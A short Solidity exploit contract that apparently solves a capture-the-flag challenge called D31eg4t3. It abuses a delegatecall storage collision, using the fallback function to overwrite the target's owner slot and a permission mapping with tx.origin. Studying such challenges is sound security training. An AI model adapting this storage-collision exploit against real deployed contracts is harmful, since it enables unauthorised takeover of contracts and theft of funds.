// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./D31eg4t3.sol";
contract Attacker{

  uint a = 12345;
  uint8 b = 32;
  string private d; 
  uint32 private c; 
  string private mot;
  address public hacker; // owner position 6th
  mapping (address => bool) public canYouHackMejajaja; // canYouHackMe position 7th
  D31eg4t3 d31eg4t3;

 // Set the contract to interact with.
  constructor(address _D31eg4t3) {
    d31eg4t3 = D31eg4t3(_D31eg4t3);
  }

 // Call the delegateCall function with an empty bytes to call the fallback function.
  function hack() public {
    (bool hacked,) = d31eg4t3.hackMe("");
    require(hacked, "Hack failed");
  }

 // The fallback function will return the slot position of the contract. 
 // Example: It will check in which position the variable hacker (6th) same as owner and it will set the value (tx.origin)
 // Same as the canYouHackMe mapping (Position 7th).
  fallback() external {
    hacker = tx.origin;
    canYouHackMejajaja[tx.origin] = true;
  }
}